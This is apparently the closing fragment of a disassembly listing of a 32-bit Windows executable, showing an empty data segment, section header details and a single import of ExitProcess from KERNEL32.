; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure data
; Segment permissions: Read/Write
DATA		segment	para public 'DATA' use32
		assume cs:DATA
		;org 439000h
		align 2000h
DATA		ends

;
; Imports from KERNEL32
;
; Section 3. (virtual address 0003A000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00038200
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Externs
; _idata
; void __stdcall ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; DATA XREF: CODE:00438A95r



		end start
